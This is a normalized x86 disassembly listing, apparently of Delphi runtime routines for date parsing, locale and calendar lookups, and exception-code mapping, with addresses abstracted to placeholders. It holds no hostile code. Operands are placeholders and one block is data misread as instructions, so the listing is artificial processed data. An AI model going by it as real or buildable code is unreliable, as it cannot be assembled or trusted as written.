test eax eax
je r-xdata
mov edx ebx
movzx ecx [ rw-data ]
mov eax esi
call sub_40cc08
mov edx ebx
mov eax esi
call sub_40ca78
cmp [ rw-data ] 0x0
je r-xdata
movzx edi [ ebp - 0x14 ]
movzx eax [ ebp - 0x1b ]
mov [ ebp - 0x1c ] al
movzx eax [ ebp - 0x10 ]
mov [ ebp - 0x16 ] ax
movzx eax [ ebp - 0x12 ]
mov [ ebp - 0x18 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
movzx eax [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
movzx edi [ ebp - 0x14 ]
movzx eax [ ebp - 0x1b ]
mov [ ebp - 0x1c ] al
movzx eax [ ebp - 0x12 ]
mov [ ebp - 0x16 ] ax
movzx eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_405120
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40cc90
jmp r-xdata
cmp [ ebp - 0x1c ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40cd2c
pop ecx
mov edi eax
jmp r-xdata
movzx edi [ ebp - 0x10 ]
movzx eax [ ebp - 0x19 ]
mov [ ebp - 0x1c ] al
movzx eax [ ebp - 0x12 ]
mov [ ebp - 0x16 ] ax
movzx eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40ca78
mov eax esi
call sub_405120
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_40be58
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_405120
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_405384
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_409374
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_405120
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_405384
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_409374
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40d0d4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40cb30
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40cb30
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40cb30
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40ca9c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40ca78
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40cb30
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
movzx ecx [ rw-data ]
mov eax ebp
call sub_40cc08
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40ca9c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40cb30
test al al
jne r-xdata
mov edx esi
movzx ecx [ rw-data ]
mov eax ebp
call sub_40cc08
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40ca78
movzx eax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
movzx ecx [ esp + 0x10 ]
movzx edx [ esp + 0xe ]
movzx eax [ esp + 0xc ]
call sub_40ba30
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40cb30
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40ca9c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40cb30
test al al
jne r-xdata
mov edx esi
movzx ecx [ rw-data ]
mov eax ebp
call sub_40cc08
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40cb30
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40ca9c
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40d2cc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40d0d4
test al al
je r-xdata
xor eax eax
mov eax ebx
test eax eax
je r-xdata
cmp eax [ esp ]
setl al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
pop edx
pop esi
pop ebx
retn
sub_40d304
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40cd88
test al al
jne r-xdata
mov eax esi
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp eax [ esp ]
jge r-xdata
sub eax 0x4
mov eax [ eax ]
test al al
je r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40d0d4
mov al 0x1
jmp r-xdata
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
jb r-xdata
mov edx edi
mov eax esi
call sub_40d2cc
mov ebx eax
jmp r-xdata
xor al 0x1
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_40d3a0
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_404f34
add esp 0x100
pop ebx
retn
movzx edx [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40d3ec
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_404e98
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_404f34
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40d438
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
movzx eax [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40d464
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40d3ec
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_406fd4
sub_40d4a0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40d5b3
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40d464
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404e98
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40d464
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404e98
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40d464
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404e98
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40d464
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_404e98
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d5ba
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_404e68
retn
sub_40d5c4
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_40503c
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40d600
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40d665
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40503c
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_409a24
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d66c
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
inc ebx
sub_40d678
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40d70f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40d3ec
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_409a24
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d716
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40d5c4
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40d600
call EnumCalendarInfoA
sub_40d728
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40d8f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_404e44
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40d3ec
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_409a24
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_405120
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
movzx eax [ esi + ebx - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8ff
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_404e68
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_40a484
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40e7d0
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_405384
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_40512c
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_404e98
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_40a484
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40512c
inc ebx
jmp r-xdata
mov eax esi
call sub_405120
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_40a484
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40512c
add ebx 0x3
jmp r-xdata
inc ebx
movzx eax [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
movzx eax [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40512c
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40512c
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
movzx edx [ esi + ebx - 0x1 ]
call sub_40502c
mov edx [ ebp - 0xc ]
mov eax edi
call sub_40512c
lea eax [ ebp - 0x14 ]
movzx edx [ esi + ebx - 0x1 ]
call sub_40502c
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_40512c
sub_40d964
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40d958
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40ea90
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_40a37c
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4064f8
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_403e44
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40ad68
mov eax [ ebp - 0x4 ]
call sub_40a308
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_405324
mov ebx eax
mov eax ebx
call sub_40a308
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40daec
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40d964
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4064f8
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_4035b4
call sub_402e84
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_40a308
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40dbb4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404e98
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_40dbf0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40dc4a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_40ada8
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc51
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
add esp 0xfffffff0
call sub_404288
sub_40dc51
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_40dc70
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_406fd4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_40dcac
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40dd18
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_406fd4
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_40ada8
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd1f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
add esp 0xfffffff0
call sub_404288
sub_40dd1f
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_40dd6c
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402f7c
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40ddcc
rcr ch 0x1
inc eax
add [ esi ] cl
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
cmp al 0xff
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x4004010 ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx + 0x74cafed0 ]
or al 0xfe
0x1074
sub_40ddf9
dec edx
sub dl 0x16
jb r-xdata
movzx eax al
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40dbb4
mov edx eax
jmp r-xdata
jmp r-xdata
push ebx
mov eax edx
jmp sub_4047d8
call sub_40dd6c
mov edx eax
sub_40de3c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ded8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404edc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dedf
lea eax [ ebp - 0x20 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_40df2c
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40dfc4
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40e17f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_4050b4
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_40a12c
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e186
lea eax [ ebp - 0x170 ]
call sub_404e44
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_40e190
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40e249
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40df2c
movzx eax al
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40dbb4
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
push ebp
call sub_40dfc4
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e250
lea eax [ ebp - 0x10 ]
call sub_404e44
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
mov ebx eax
sub_40e268
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40e258
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40dfac
mov eax [ rw-data ]
mov [ eax ] sub_40e190
mov eax sub_40def8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40df14
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40e2ec
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
